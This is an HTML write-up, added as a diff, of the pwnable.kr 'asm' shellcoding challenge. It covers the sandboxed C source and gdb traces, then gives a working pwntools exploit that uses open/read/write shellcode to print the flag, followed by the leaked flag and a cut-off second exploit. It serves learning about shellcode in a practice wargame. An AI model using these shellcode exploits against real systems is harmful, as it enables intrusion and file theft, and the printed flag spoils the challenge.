@@ -1,0 +1,818 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>WriteUp</title>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<style type="text/css">
+/* GitHub stylesheet for MarkdownPad (http://markdownpad.com) */
+/* Author: Nicolas Hery - http://nicolashery.com */
+/* Version: b13fe65ca28d2e568c6ed5d7f06581183df8f2ff */
+/* Source: https://github.com/nicolahery/markdownpad-github */
+
+/* RESET
+=============================================================================*/
+
+html, body, div, span, applet, object, iframe, h1, h2, h3, h4, h5, h6, p, blockquote, pre, a, abbr, acronym, address, big, cite, code, del, dfn, em, img, ins, kbd, q, s, samp, small, strike, strong, sub, sup, tt, var, b, u, i, center, dl, dt, dd, ol, ul, li, fieldset, form, label, legend, table, caption, tbody, tfoot, thead, tr, th, td, article, aside, canvas, details, embed, figure, figcaption, footer, header, hgroup, menu, nav, output, ruby, section, summary, time, mark, audio, video {
+  margin: 0;
+  padding: 0;
+  border: 0;
+}
+
+/* BODY
+=============================================================================*/
+
+body {
+  font-family: Helvetica, arial, freesans, clean, sans-serif;
+  font-size: 14px;
+  line-height: 1.6;
+  color: #333;
+  background-color: #fff;
+  padding: 20px;
+  max-width: 960px;
+  margin: 0 auto;
+}
+
+body>*:first-child {
+  margin-top: 0 !important;
+}
+
+body>*:last-child {
+  margin-bottom: 0 !important;
+}
+
+/* BLOCKS
+=============================================================================*/
+
+p, blockquote, ul, ol, dl, table, pre {
+  margin: 15px 0;
+}
+
+/* HEADERS
+=============================================================================*/
+
+h1, h2, h3, h4, h5, h6 {
+  margin: 20px 0 10px;
+  padding: 0;
+  font-weight: bold;
+  -webkit-font-smoothing: antialiased;
+}
+
+h1 tt, h1 code, h2 tt, h2 code, h3 tt, h3 code, h4 tt, h4 code, h5 tt, h5 code, h6 tt, h6 code {
+  font-size: inherit;
+}
+
+h1 {
+  font-size: 28px;
+  color: #000;
+}
+
+h2 {
+  font-size: 24px;
+  border-bottom: 1px solid #ccc;
+  color: #000;
+}
+
+h3 {
+  font-size: 18px;
+}
+
+h4 {
+  font-size: 16px;
+}
+
+h5 {
+  font-size: 14px;
+}
+
+h6 {
+  color: #777;
+  font-size: 14px;
+}
+
+body>h2:first-child, body>h1:first-child, body>h1:first-child+h2, body>h3:first-child, body>h4:first-child, body>h5:first-child, body>h6:first-child {
+  margin-top: 0;
+  padding-top: 0;
+}
+
+a:first-child h1, a:first-child h2, a:first-child h3, a:first-child h4, a:first-child h5, a:first-child h6 {
+  margin-top: 0;
+  padding-top: 0;
+}
+
+h1+p, h2+p, h3+p, h4+p, h5+p, h6+p {
+  margin-top: 10px;
+}
+
+/* LINKS
+=============================================================================*/
+
+a {
+  color: #4183C4;
+  text-decoration: none;
+}
+
+a:hover {
+  text-decoration: underline;
+}
+
+/* LISTS
+=============================================================================*/
+
+ul, ol {
+  padding-left: 30px;
+}
+
+ul li > :first-child, 
+ol li > :first-child, 
+ul li ul:first-of-type, 
+ol li ol:first-of-type, 
+ul li ol:first-of-type, 
+ol li ul:first-of-type {
+  margin-top: 0px;
+}
+
+ul ul, ul ol, ol ol, ol ul {
+  margin-bottom: 0;
+}
+
+dl {
+  padding: 0;
+}
+
+dl dt {
+  font-size: 14px;
+  font-weight: bold;
+  font-style: italic;
+  padding: 0;
+  margin: 15px 0 5px;
+}
+
+dl dt:first-child {
+  padding: 0;
+}
+
+dl dt>:first-child {
+  margin-top: 0px;
+}
+
+dl dt>:last-child {
+  margin-bottom: 0px;
+}
+
+dl dd {
+  margin: 0 0 15px;
+  padding: 0 15px;
+}
+
+dl dd>:first-child {
+  margin-top: 0px;
+}
+
+dl dd>:last-child {
+  margin-bottom: 0px;
+}
+
+/* CODE
+=============================================================================*/
+
+pre, code, tt {
+  font-size: 12px;
+  font-family: Consolas, "Liberation Mono", Courier, monospace;
+}
+
+code, tt {
+  margin: 0 0px;
+  padding: 0px 0px;
+  white-space: nowrap;
+  border: 1px solid #eaeaea;
+  background-color: #f8f8f8;
+  border-radius: 3px;
+}
+
+pre>code {
+  margin: 0;
+  padding: 0;
+  white-space: pre;
+  border: none;
+  background: transparent;
+}
+
+pre {
+  background-color: #f8f8f8;
+  border: 1px solid #ccc;
+  font-size: 13px;
+  line-height: 19px;
+  overflow: auto;
+  padding: 6px 10px;
+  border-radius: 3px;
+}
+
+pre code, pre tt {
+  background-color: transparent;
+  border: none;
+}
+
+kbd {
+    -moz-border-bottom-colors: none;
+    -moz-border-left-colors: none;
+    -moz-border-right-colors: none;
+    -moz-border-top-colors: none;
+    background-color: #DDDDDD;
+    background-image: linear-gradient(#F1F1F1, #DDDDDD);
+    background-repeat: repeat-x;
+    border-color: #DDDDDD #CCCCCC #CCCCCC #DDDDDD;
+    border-image: none;
+    border-radius: 2px 2px 2px 2px;
+    border-style: solid;
+    border-width: 1px;
+    font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
+    line-height: 10px;
+    padding: 1px 4px;
+}
+
+/* QUOTES
+=============================================================================*/
+
+blockquote {
+  border-left: 4px solid #DDD;
+  padding: 0 15px;
+  color: #777;
+}
+
+blockquote>:first-child {
+  margin-top: 0px;
+}
+
+blockquote>:last-child {
+  margin-bottom: 0px;
+}
+
+/* HORIZONTAL RULES
+=============================================================================*/
+
+hr {
+  clear: both;
+  margin: 15px 0;
+  height: 0px;
+  overflow: hidden;
+  border: none;
+  background: transparent;
+  border-bottom: 4px solid #ddd;
+  padding: 0;
+}
+
+/* TABLES
+=============================================================================*/
+
+table th {
+  font-weight: bold;
+}
+
+table th, table td {
+  border: 1px solid #ccc;
+  padding: 6px 13px;
+}
+
+table tr {
+  border-top: 1px solid #ccc;
+  background-color: #fff;
+}
+
+table tr:nth-child(2n) {
+  background-color: #f8f8f8;
+}
+
+/* IMAGES
+=============================================================================*/
+
+img {
+  max-width: 100%
+}
+</style>
+<style type="text/css">
+.highlight  { background: #ffffff; }
+.highlight .c { color: #999988; font-style: italic } /* Comment */
+.highlight .err { color: #a61717; background-color: #e3d2d2 } /* Error */
+.highlight .k { font-weight: bold } /* Keyword */
+.highlight .o { font-weight: bold } /* Operator */
+.highlight .cm { color: #999988; font-style: italic } /* Comment.Multiline */
+.highlight .cp { color: #999999; font-weight: bold } /* Comment.Preproc */
+.highlight .c1 { color: #999988; font-style: italic } /* Comment.Single */
+.highlight .cs { color: #999999; font-weight: bold; font-style: italic } /* Comment.Special */
+.highlight .gd { color: #000000; background-color: #ffdddd } /* Generic.Deleted */
+.highlight .gd .x { color: #000000; background-color: #ffaaaa } /* Generic.Deleted.Specific */
+.highlight .ge { font-style: italic } /* Generic.Emph */
+.highlight .gr { color: #aa0000 } /* Generic.Error */
+.highlight .gh { color: #999999 } /* Generic.Heading */
+.highlight .gi { color: #000000; background-color: #ddffdd } /* Generic.Inserted */
+.highlight .gi .x { color: #000000; background-color: #aaffaa } /* Generic.Inserted.Specific */
+.highlight .go { color: #888888 } /* Generic.Output */
+.highlight .gp { color: #555555 } /* Generic.Prompt */
+.highlight .gs { font-weight: bold } /* Generic.Strong */
+.highlight .gu { color: #aaaaaa } /* Generic.Subheading */
+.highlight .gt { color: #aa0000 } /* Generic.Traceback */
+.highlight .kc { font-weight: bold } /* Keyword.Constant */
+.highlight .kd { font-weight: bold } /* Keyword.Declaration */
+.highlight .kp { font-weight: bold } /* Keyword.Pseudo */
+.highlight .kr { font-weight: bold } /* Keyword.Reserved */
+.highlight .kt { color: #445588; font-weight: bold } /* Keyword.Type */
+.highlight .m { color: #009999 } /* Literal.Number */
+.highlight .s { color: #d14 } /* Literal.String */
+.highlight .na { color: #008080 } /* Name.Attribute */
+.highlight .nb { color: #0086B3 } /* Name.Builtin */
+.highlight .nc { color: #445588; font-weight: bold } /* Name.Class */
+.highlight .no { color: #008080 } /* Name.Constant */
+.highlight .ni { color: #800080 } /* Name.Entity */
+.highlight .ne { color: #990000; font-weight: bold } /* Name.Exception */
+.highlight .nf { color: #990000; font-weight: bold } /* Name.Function */
+.highlight .nn { color: #555555 } /* Name.Namespace */
+.highlight .nt { color: #000080 } /* Name.Tag */
+.highlight .nv { color: #008080 } /* Name.Variable */
+.highlight .ow { font-weight: bold } /* Operator.Word */
+.highlight .w { color: #bbbbbb } /* Text.Whitespace */
+.highlight .mf { color: #009999 } /* Literal.Number.Float */
+.highlight .mh { color: #009999 } /* Literal.Number.Hex */
+.highlight .mi { color: #009999 } /* Literal.Number.Integer */
+.highlight .mo { color: #009999 } /* Literal.Number.Oct */
+.highlight .sb { color: #d14 } /* Literal.String.Backtick */
+.highlight .sc { color: #d14 } /* Literal.String.Char */
+.highlight .sd { color: #d14 } /* Literal.String.Doc */
+.highlight .s2 { color: #d14 } /* Literal.String.Double */
+.highlight .se { color: #d14 } /* Literal.String.Escape */
+.highlight .sh { color: #d14 } /* Literal.String.Heredoc */
+.highlight .si { color: #d14 } /* Literal.String.Interpol */
+.highlight .sx { color: #d14 } /* Literal.String.Other */
+.highlight .sr { color: #009926 } /* Literal.String.Regex */
+.highlight .s1 { color: #d14 } /* Literal.String.Single */
+.highlight .ss { color: #990073 } /* Literal.String.Symbol */
+.highlight .bp { color: #999999 } /* Name.Builtin.Pseudo */
+.highlight .vc { color: #008080 } /* Name.Variable.Class */
+.highlight .vg { color: #008080 } /* Name.Variable.Global */
+.highlight .vi { color: #008080 } /* Name.Variable.Instance */
+.highlight .il { color: #009999 } /* Literal.Number.Integer.Long */
+.pl-c {
+    color: #969896;
+}
+
+.pl-c1,.pl-mdh,.pl-mm,.pl-mp,.pl-mr,.pl-s1 .pl-v,.pl-s3,.pl-sc,.pl-sv {
+    color: #0086b3;
+}
+
+.pl-e,.pl-en {
+    color: #795da3;
+}
+
+.pl-s1 .pl-s2,.pl-smi,.pl-smp,.pl-stj,.pl-vo,.pl-vpf {
+    color: #333;
+}
+
+.pl-ent {
+    color: #63a35c;
+}
+
+.pl-k,.pl-s,.pl-st {
+    color: #a71d5d;
+}
+
+.pl-pds,.pl-s1,.pl-s1 .pl-pse .pl-s2,.pl-sr,.pl-sr .pl-cce,.pl-sr .pl-sra,.pl-sr .pl-sre,.pl-src,.pl-v {
+    color: #df5000;
+}
+
+.pl-id {
+    color: #b52a1d;
+}
+
+.pl-ii {
+    background-color: #b52a1d;
+    color: #f8f8f8;
+}
+
+.pl-sr .pl-cce {
+    color: #63a35c;
+    font-weight: bold;
+}
+
+.pl-ml {
+    color: #693a17;
+}
+
+.pl-mh,.pl-mh .pl-en,.pl-ms {
+    color: #1d3e81;
+    font-weight: bold;
+}
+
+.pl-mq {
+    color: #008080;
+}
+
+.pl-mi {
+    color: #333;
+    font-style: italic;
+}
+
+.pl-mb {
+    color: #333;
+    font-weight: bold;
+}
+
+.pl-md,.pl-mdhf {
+    background-color: #ffecec;
+    color: #bd2c00;
+}
+
+.pl-mdht,.pl-mi1 {
+    background-color: #eaffea;
+    color: #55a532;
+}
+
+.pl-mdr {
+    color: #795da3;
+    font-weight: bold;
+}
+
+.pl-mo {
+    color: #1d3e81;
+}
+.task-list {
+padding-left:10px;
+margin-bottom:0;
+}
+
+.task-list li {
+    margin-left: 20px;
+}
+
+.task-list-item {
+list-style-type:none;
+padding-left:10px;
+}
+
+.task-list-item label {
+font-weight:400;
+}
+
+.task-list-item.enabled label {
+cursor:pointer;
+}
+
+.task-list-item+.task-list-item {
+margin-top:3px;
+}
+
+.task-list-item-checkbox {
+display:inline-block;
+margin-left:-20px;
+margin-right:3px;
+vertical-align:1px;
+}
+</style>
+</head>
+<body>
+<h1 id="pwnable-kr-toddler-s-bottle-asm">PWNABLE.KR-Toddler&#39;s Bottle-asm</h1>
+<p><strong>Author：wnagzihxa1n<br>Mail：tudouboom@163.com</strong></p>
+<h2 id="problem-description">Problem Description</h2>
+<pre><code>Mommy! I think I know how to make shellcodes
+
+ssh asm@pwnable.kr -p2222 (pw: guest)
+</code></pre><p>连上去后，什么鬼</p>
+<pre><code>asm@ubuntu:~$ ls -l
+total 28
+-rwxr-xr-x 1 root root 13704 Nov 29  2016 asm
+-rw-r--r-- 1 root root  1793 Nov 29  2016 asm.c
+-rw-r--r-- 1 root root   211 Nov 19  2016 readme
+-rw-r--r-- 1 root root    67 Nov 19  2016 this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong
+</code></pre><p>这。。。。。。，场面一度很尴尬</p>
+<pre><code>asm@ubuntu:~$ cat this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong
+this is fake flag file for letting you know the name of flag file.
+</code></pre><p>哎，读源码好了</p>
+<pre><code>#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;seccomp.h&gt;
+#include &lt;sys/prctl.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;unistd.h&gt;
+
+#define LENGTH 128
+
+void sandbox(){
+    scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
+    if (ctx == NULL) {
+        printf(&quot;seccomp error\n&quot;);
+        exit(0);
+    }
+
+    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
+    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
+    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
+    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
+    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);
+
+    if (seccomp_load(ctx) &lt; 0){
+        seccomp_release(ctx);
+        printf(&quot;seccomp error\n&quot;);
+        exit(0);
+    }
+    seccomp_release(ctx);
+}
+
+char stub[] = &quot;\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff&quot;;
+unsigned char filter[256];
+int main(int argc, char* argv[]){
+
+    setvbuf(stdout, 0, _IONBF, 0);
+    setvbuf(stdin, 0, _IOLBF, 0);
+
+    printf(&quot;Welcome to shellcoding practice challenge.\n&quot;);
+    printf(&quot;In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\n&quot;);
+    printf(&quot;Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\n&quot;);
+    printf(&quot;If this does not challenge you. you should play &#39;asg&#39; challenge :)\n&quot;);
+
+    char* sh = (char*)mmap(0x41414000, 0x1000, 7, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, 0, 0);
+    memset(sh, 0x90, 0x1000);
+    memcpy(sh, stub, strlen(stub));
+
+    int offset = sizeof(stub);
+    printf(&quot;give me your x64 shellcode: &quot;);
+    read(0, sh+offset, 1000);
+
+    alarm(10);
+    chroot(&quot;/home/asm_pwn&quot;);    // you are in chroot jail. so you can&#39;t use symlink in /tmp
+    sandbox();
+    ((void (*)(void))sh)();
+    return 0;
+}
+</code></pre><p>有一段shellcode，动态跑一下看看是啥，首先是初始化空间为<code>0x90</code></p>
+<pre><code>[----------------------------------registers-----------------------------------]
+RAX: 0x2d (&#39;-&#39;)
+RBX: 0x0 
+RCX: 0x0 
+RDX: 0xffffe00000000000 
+RSI: 0x90 
+RDI: 0x5555557560c0 --&gt; 0x3148db3148c03148 
+RBP: 0x7fffffffdd70 --&gt; 0x555555554eb0 (&lt;__libc_csu_init&gt;:    push   r15)
+RSP: 0x7fffffffdd50 --&gt; 0x7fffffffde58 --&gt; 0x7fffffffe1fc (&quot;/home/wnagzihxa1n/asm&quot;)
+RIP: 0x555555554e33 (&lt;main+207&gt;:    mov    rdx,rax)
+R8 : 0xe000 
+R9 : 0x0 
+R10: 0x309 
+R11: 0x7ffff785a720 (&lt;strlen&gt;:    pxor   xmm0,xmm0)
+R12: 0x555555554b20 (&lt;_start&gt;:    xor    ebp,ebp)
+R13: 0x7fffffffde50 --&gt; 0x1 
+R14: 0x0 
+R15: 0x0
+EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x555555554e24 &lt;main+192&gt;:    lea    rax,[rip+0x201295]        # 0x5555557560c0 &lt;stub&gt;
+   0x555555554e2b &lt;main+199&gt;:    mov    rdi,rax
+   0x555555554e2e &lt;main+202&gt;:    call   0x555555554a60 &lt;strlen@plt&gt;
+=&gt; 0x555555554e33 &lt;main+207&gt;:    mov    rdx,rax
+   0x555555554e36 &lt;main+210&gt;:    mov    rax,QWORD PTR [rbp-0x8]
+   0x555555554e3a &lt;main+214&gt;:    lea    rcx,[rip+0x20127f]        # 0x5555557560c0 &lt;stub&gt;
+   0x555555554e41 &lt;main+221&gt;:    mov    rsi,rcx
+   0x555555554e44 &lt;main+224&gt;:    mov    rdi,rax
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffdd50 --&gt; 0x7fffffffde58 --&gt; 0x7fffffffe1fc (&quot;/home/wnagzihxa1n/asm&quot;)
+0008| 0x7fffffffdd58 --&gt; 0x155554b20 
+0016| 0x7fffffffdd60 --&gt; 0x7fffffffde50 --&gt; 0x1 
+0024| 0x7fffffffdd68 --&gt; 0x41414000 --&gt; 0x9090909090909090 
+0032| 0x7fffffffdd70 --&gt; 0x555555554eb0 (&lt;__libc_csu_init&gt;:    push   r15)
+0040| 0x7fffffffdd78 --&gt; 0x7ffff77ef830 (&lt;__libc_start_main+240&gt;:    mov    edi,eax)
+0048| 0x7fffffffdd80 --&gt; 0x0 
+0056| 0x7fffffffdd88 --&gt; 0x7fffffffde58 --&gt; 0x7fffffffe1fc (&quot;/home/wnagzihxa1n/asm&quot;)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x0000555555554e33 in main ()
+gdb-peda$ x/20x 0x41414000
+0x41414000:    0x9090909090909090    0x9090909090909090
+0x41414010:    0x9090909090909090    0x9090909090909090
+0x41414020:    0x9090909090909090    0x9090909090909090
+0x41414030:    0x9090909090909090    0x9090909090909090
+0x41414040:    0x9090909090909090    0x9090909090909090
+0x41414050:    0x9090909090909090    0x9090909090909090
+0x41414060:    0x9090909090909090    0x9090909090909090
+0x41414070:    0x9090909090909090    0x9090909090909090
+0x41414080:    0x9090909090909090    0x9090909090909090
+0x41414090:    0x9090909090909090    0x9090909090909090
+</code></pre><p>然后赋值</p>
+<pre><code>[----------------------------------registers-----------------------------------]
+RAX: 0x41414000 --&gt; 0x3148db3148c03148 
+RBX: 0x0 
+RCX: 0x5a (&#39;Z&#39;)
+RDX: 0x2d (&#39;-&#39;)
+RSI: 0x5555557560c0 --&gt; 0x3148db3148c03148 
+RDI: 0x41414000 --&gt; 0x3148db3148c03148 
+RBP: 0x7fffffffdd70 --&gt; 0x555555554eb0 (&lt;__libc_csu_init&gt;:    push   r15)
+RSP: 0x7fffffffdd50 --&gt; 0x7fffffffde58 --&gt; 0x7fffffffe1fc (&quot;/home/wnagzihxa1n/asm&quot;)
+RIP: 0x555555554e4c (&lt;main+232&gt;:    mov    DWORD PTR [rbp-0xc],0x2e)
+R8 : 0xe000 
+R9 : 0x0 
+R10: 0x46c 
+R11: 0x7ffff786e820 (&lt;__memcpy_sse2_unaligned&gt;:    mov    rax,rsi)
+R12: 0x555555554b20 (&lt;_start&gt;:    xor    ebp,ebp)
+R13: 0x7fffffffde50 --&gt; 0x1 
+R14: 0x0 
+R15: 0x0
+EFLAGS: 0x287 (CARRY PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x555555554e41 &lt;main+221&gt;:    mov    rsi,rcx
+   0x555555554e44 &lt;main+224&gt;:    mov    rdi,rax
+   0x555555554e47 &lt;main+227&gt;:    call   0x555555554ae0 &lt;memcpy@plt&gt;
+=&gt; 0x555555554e4c &lt;main+232&gt;:    mov    DWORD PTR [rbp-0xc],0x2e
+   0x555555554e53 &lt;main+239&gt;:    lea    rdi,[rip+0x209]        # 0x555555555063
+   0x555555554e5a &lt;main+246&gt;:    mov    eax,0x0
+   0x555555554e5f &lt;main+251&gt;:    call   0x555555554a80 &lt;printf@plt&gt;
+   0x555555554e64 &lt;main+256&gt;:    mov    eax,DWORD PTR [rbp-0xc]
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffdd50 --&gt; 0x7fffffffde58 --&gt; 0x7fffffffe1fc (&quot;/home/wnagzihxa1n/asm&quot;)
+0008| 0x7fffffffdd58 --&gt; 0x155554b20 
+0016| 0x7fffffffdd60 --&gt; 0x7fffffffde50 --&gt; 0x1 
+0024| 0x7fffffffdd68 --&gt; 0x41414000 --&gt; 0x3148db3148c03148 
+0032| 0x7fffffffdd70 --&gt; 0x555555554eb0 (&lt;__libc_csu_init&gt;:    push   r15)
+0040| 0x7fffffffdd78 --&gt; 0x7ffff77ef830 (&lt;__libc_start_main+240&gt;:    mov    edi,eax)
+0048| 0x7fffffffdd80 --&gt; 0x0 
+0056| 0x7fffffffdd88 --&gt; 0x7fffffffde58 --&gt; 0x7fffffffe1fc (&quot;/home/wnagzihxa1n/asm&quot;)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x0000555555554e4c in main ()
+gdb-peda$ x/20x 0x41414000
+0x41414000:    0x3148db3148c03148    0x48f63148d23148c9
+0x41414010:    0xc0314ded3148ff31    0x314dd2314dc9314d
+0x41414020:    0x4ded314de4314ddb    0x909090ff314df631
+0x41414030:    0x9090909090909090    0x9090909090909090
+0x41414040:    0x9090909090909090    0x9090909090909090
+0x41414050:    0x9090909090909090    0x9090909090909090
+0x41414060:    0x9090909090909090    0x9090909090909090
+0x41414070:    0x9090909090909090    0x9090909090909090
+0x41414080:    0x9090909090909090    0x9090909090909090
+0x41414090:    0x9090909090909090    0x9090909090909090
+</code></pre><p>查看汇编，咦，寄存器全部清空，啥意思？？？？？？</p>
+<pre><code>gdb-peda$ x/20i 0x41414000
+   0x41414000:    xor    rax,rax
+   0x41414003:    xor    rbx,rbx
+   0x41414006:    xor    rcx,rcx
+   0x41414009:    xor    rdx,rdx
+   0x4141400c:    xor    rsi,rsi
+   0x4141400f:    xor    rdi,rdi
+   0x41414012:    xor    rbp,rbp
+   0x41414015:    xor    r8,r8
+   0x41414018:    xor    r9,r9
+   0x4141401b:    xor    r10,r10
+   0x4141401e:    xor    r11,r11
+   0x41414021:    xor    r12,r12
+   0x41414024:    xor    r13,r13
+   0x41414027:    xor    r14,r14
+   0x4141402a:    xor    r15,r15
+   0x4141402d:    nop
+   0x4141402e:    nop
+   0x4141402f:    nop
+   0x41414030:    nop
+   0x41414031:    nop
+</code></pre><p>这里会读入由用户输入的数据，数据拼接在这堆指令后面</p>
+<pre><code>char* sh = (char*)mmap(0x41414000, 0x1000, 7, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, 0, 0);
+memset(sh, 0x90, 0x1000);
+memcpy(sh, stub, strlen(stub));
+
+int offset = sizeof(stub);
+printf(&quot;give me your x64 shellcode: &quot;);
+read(0, sh+offset, 1000);
+</code></pre><p>再接着限制了沙箱可执行的函数</p>
+<pre><code>seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
+seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
+seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
+seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
+seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);
+</code></pre><p>也就是说，最后会执行这段清空寄存器的代码，然后我们的数据跟在这段代码的后面，会一起执行，而我们输入的代码有限制</p>
+<p>那么接下来的方法挺简单的，有两种，一种是手写汇编，实现读取文件数据，然后输出到标准输出流，第二种是用pwntools的shellcraft</p>
+<p>手写汇编并不难，只是字符串那个麻烦点，要一段一段的压栈</p>
+<p>所以，用shellcraft吧</p>
+<pre><code># coding = utf-8
+
+import pwn
+
+def main():
+    pwn.context(arch=&#39;amd64&#39;, os=&#39;linux&#39;)
+    mssh = pwn.ssh(host=&#39;pwnable.kr&#39;, user=&#39;asm&#39;, password=&#39;guest&#39;, port=2222)
+    attack = mssh.connect_remote(&#39;localhost&#39;, 9026)
+    shellcode = pwn.shellcraft.pushstr(&#39;this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong&#39;)
+    shellcode += pwn.shellcraft.open(&#39;rsp&#39;, 0, 0)
+    shellcode += pwn.shellcraft.read(&#39;rax&#39;, &#39;rsp&#39;, 1024)
+    shellcode += pwn.shellcraft.write(1, &#39;rsp&#39;, 1024)
+    attack.recvuntil(&#39;give me your x64 shellcode: &#39;)
+    attack.send(pwn.asm(shellcode))
+    print attack.recvall()
+
+if __name__ == &#39;__main__&#39;:
+    main()
+</code></pre><p>跑起来</p>
+<pre><code>wnagzihxain@tot0c ~&gt; python Exp.py 
+[+] Connecting to pwnable.kr on port 2222: Done
+[!] Couldn&#39;t check security settings on &#39;pwnable.kr&#39;
+[+] Connecting to localhost:9026 via SSH to pwnable.kr: Done
+[+] Receiving all data: Done (1.00KB)
+[*] Closed remote connection to localhost:9026 via SSH connection to pwnable.kr
+Mak1ng_shelLcodE_i5_veRy_eaSy
+lease_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong\x00\xa9.m��U\x00\x0\xa2cm� +m�\x00\x00\x00\x00\xa2cm.\x00\x00\x00\x00@AA\x00\x00\x00\x00\xb0.m��U\x00\x00\x1c\xbcP\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0\xa2cm�\x00\x00\x00\x00\x00d-m��U\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00pf�~\xab\x07\xfe\xbd +m��U\x00\x00\x00\xa2cm�\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00pf�a\xb6I��pfw,I���\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d-m��U\x00\x00 /m��U\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00 +m��U\x00\x00\x00\xa2cm�\x00\x00\x00\x00\x00\x00I+m��U\x00\x00��cm�\x7f\x00\x00\x1c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa4\xa8cm�\x00\x00\x00\x00\x00\x00\xb6\xa8cm���cm�Ҩcm���cm���cm���cm�
+�cm���cm���cm��cm��cm�-�cm�&gt;�cm�Q�cm�Y�cm�h�cm�x�cm���cm���cm�įcm�\x00\x00\x00\x00\x00\x00!\x00\x00\x00\x00\x00\x00\x00\x00Ppm�\x00\x00\x00\x00\x00\x00\xff��\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00\x00\x00\x00\x00d\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00@ m��U\x00\x00\x04\x00\x00\x00\x00\x00\x00\x008\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00    \x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00\x00pz\xbcP\x7f\x00\x0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00    \x00\x00\x00\x00\x00\x00\x00 +m��U\x00\x00\x0b\x00\x00\x00\x00\x00\x00\x00E\x04\x00\x00\x00\x00\x00\x00\x0c\x00\x00\x00\x00\x00\x00\x00E\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00E\x04\x00\x00\x00\x00\x00\x00\x0e\x00\x00\x00\x00\x00\x00\x00E\x04\x00\x00\x00\x00\x00\x00\x17\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x19\x00\x00\x00\x00\x00\x00\x00    \xa4cm�\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1f\x00\x00\x00\x00\x00\x00\x00��cm�\x00\x00\x00\x00\x00\x00\x19\xa4cm�\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05wAN\xa0\xb64
+</code></pre><p>如果实在躁动想写汇编的同学，如下</p>
+<pre><code># coding = utf-8
+
+import pwn
+
+def main():
+    pwn.context(arch=&#39;amd64&#39;, os=&#39;linux&#39;)
+    mssh = pwn.ssh(host=&#39;pwnable.kr&#39;, user=&#39;asm&#39;, password=&#39;guest&#39;, port=2222)
+    attack = mssh.connect_remote(&#39;0.0.0.0&#39;, 9026)
+    shellcode = pwn.asm(&quot;mov rax, 0x101010101010101&quot;)
+    shellcode += pwn.asm(&quot;push rax&quot;)
+    shellcode += pwn.asm(&quot;mov rax, 0x101010101010101 ^ 0x676e6f306f306f&quot;)
